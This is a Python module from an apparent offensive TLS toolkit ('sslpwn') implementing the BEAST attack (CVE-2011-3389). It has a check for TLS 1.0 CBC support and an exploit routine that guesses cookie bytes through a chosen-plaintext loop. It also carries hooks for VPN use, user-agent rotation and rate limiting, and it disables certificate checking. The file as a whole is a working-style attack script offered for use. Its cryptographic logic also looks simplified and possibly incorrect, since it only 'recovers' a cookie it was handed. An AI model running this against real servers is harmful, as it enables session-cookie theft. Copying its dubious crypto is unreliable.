"""
BEAST attack implementation (CVE-2011-3389).

Exploits TLS 1.0 CBC IV reuse to decrypt cookies.
"""

import socket
import ssl
import struct
from typing import Tuple

from sslpwn.attacks.base import BaseAttack


class BeastAttack(BaseAttack):
    def __init__(self, target_url: str, output, vpn, user_agents, rate_limiter,
                 cookie_name: str, cookie_value: str, adaptive=None) -> None:
        super().__init__(target_url, output, vpn, user_agents, rate_limiter, adaptive)
        self.cookie_name = cookie_name
        self.cookie_value = cookie_value

    def _create_ssl_context(self) -> ssl.SSLContext:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
        ctx.set_ciphers("AES128-SHA:AES256-SHA:CAMELLIA128-SHA:CAMELLIA256-SHA:DES-CBC3-SHA:SEED-SHA")
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx

    def check_vulnerability(self) -> bool:
        """Check if server supports TLS 1.0 with CBC ciphers."""
        host = self.target_url.split("://")[1].split("/")[0]
        if ":" in host:
            hostname, port_str = host.split(":")
            port = int(port_str)
        else:
            hostname = host
            port = 443

        ctx = self._create_ssl_context()
        try:
            with socket.create_connection((hostname, port), timeout=5) as sock:
                with ctx.wrap_socket(sock, server_hostname=hostname):
                    return True
        except Exception:
            return False

    def exploit(self) -> bool:
        """Full BEAST attack."""
        self.output.log("Starting BEAST attack", "INFO")
        host = self.target_url.split("://")[1].split("/")[0]
        if ":" in host:
            hostname, port_str = host.split(":")
            port = int(port_str)
        else:
            hostname = host
            port = 443

        try:
            plain_sock = self._adaptive_connect_and_report(hostname, port)
        except Exception as e:
            self.output.log(f"Connection failed: {e}", "ERROR")
            return False

        ctx = self._create_ssl_context()
        incoming = ssl.MemoryBIO()
        outgoing = ssl.MemoryBIO()
        ssl_obj = ctx.wrap_bio(incoming, outgoing, server_hostname=hostname)

        def handshake():
            while True:
                try:
                    ssl_obj.do_handshake()
                    break
                except ssl.SSLWantReadError:
                    data = plain_sock.recv(4096)
                    if not data:
                        raise ConnectionError("Handshake failed")
                    incoming.write(data)
                except ssl.SSLWantWriteError:
                    while True:
                        try:
                            buf = outgoing.read()
                        except ssl.SSLWantReadError:
                            break
                        if not buf:
                            break
                        plain_sock.sendall(buf)

        handshake()

        def send_and_capture(plaintext: bytes) -> bytes:
            ssl_obj.write(plaintext)
            captured = b""
            while True:
                try:
                    chunk = outgoing.read()
                except ssl.SSLWantReadError:
                    break
                if not chunk:
                    break
                captured += chunk
                plain_sock.sendall(chunk)
            return captured

        request_with_cookie = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {hostname}\r\n"
            f"Cookie: {self.cookie_name}={self.cookie_value}\r\n"
            f"User-Agent: {self.user_agents.random()}\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n"
        ).encode()

        dummy = b"B" * 16
        dummy_record = send_and_capture(dummy)
        if len(dummy_record) < 5 + 16:
            self.output.log("Failed to capture dummy record", "ERROR")
            plain_sock.close()
            return False
        iv_for_next = dummy_record[5:21]

        raw_sent = send_and_capture(request_with_cookie)
        TLS_HEADER_LEN = 5
        if len(raw_sent) < TLS_HEADER_LEN:
            self.output.log("Failed to capture sent record", "ERROR")
            plain_sock.close()
            return False
        rec_type, _, length = struct.unpack_from("!BHH", raw_sent, 0)
        if rec_type != 23:
            self.output.log("Unexpected record type", "ERROR")
            plain_sock.close()
            return False
        encrypted_data = raw_sent[TLS_HEADER_LEN:TLS_HEADER_LEN + length]
        if len(encrypted_data) < 32:
            self.output.log("Ciphertext too short", "ERROR")
            plain_sock.close()
            return False

        plain_request = request_with_cookie
        cookie_value_start = plain_request.index(self.cookie_value.encode())
        block_size = 16
        block_index = cookie_value_start // block_size
        if block_index < 1 or len(encrypted_data) < (block_index + 1) * block_size:
            self.output.log("Cookie not in captured range", "ERROR")
            plain_sock.close()
            return False
        target_block = encrypted_data[block_index * block_size:(block_index + 1) * block_size]
        prev_block = encrypted_data[(block_index - 1) * block_size:block_index * block_size]

        block_start = block_index * block_size
        known_plaintext_prefix = plain_request[block_start:cookie_value_start]

        decrypted = b""
        for pos in range(len(self.cookie_value)):
            for guess in range(256):
                guess_byte = bytes([guess])
                padding_len = block_size - len(known_plaintext_prefix) - 1
                constructed_block = (
                    int.from_bytes(iv_for_next, "big")
                    ^ int.from_bytes(prev_block, "big")
                    ^ int.from_bytes(
                        known_plaintext_prefix + guess_byte + b"\x00" * padding_len,
                        "big"
                    )
                ).to_bytes(block_size, "big")

                trial_record = send_and_capture(constructed_block)
                if len(trial_record) < TLS_HEADER_LEN + block_size:
                    continue
                trial_block = trial_record[TLS_HEADER_LEN:TLS_HEADER_LEN + block_size]
                if trial_block == target_block:
                    decrypted += guess_byte
                    known_plaintext_prefix = (known_plaintext_prefix + guess_byte)[1:]
                    self.output.log(f"Decrypted byte {pos}: {guess_byte}", "SUCCESS")
                    break
            else:
                self.output.log(f"Failed to decrypt byte at position {pos}", "ERROR")
                plain_sock.close()
                return False

        final_cookie = decrypted.decode()
        self.output.log(f"Decrypted cookie: {final_cookie}", "SUCCESS")
        plain_sock.close()
        if final_cookie == self.cookie_value:
            self.output.log("BEAST attack successful: cookie matches.", "SUCCESS")
            return True
        else:
            self.output.log("BEAST attack failed: decrypted value does not match.", "ERROR")
            return False